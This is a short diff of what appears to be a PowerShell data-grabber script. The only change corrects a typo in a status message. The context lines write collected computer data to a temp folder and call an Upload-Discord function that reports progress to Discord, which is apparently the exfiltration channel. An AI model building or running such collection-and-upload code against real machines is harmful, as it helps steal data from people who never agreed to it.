@@ -432,7 +432,7 @@ Upload-Discord -text "Collected all info"
 
 $output > $env:TEMP\$FolderName/computerData.txt
 
-Upload-Discord -text "Saved computer datat"
+Upload-Discord -text "Saved computer data"
 
 ############################################################################################################################################################
 
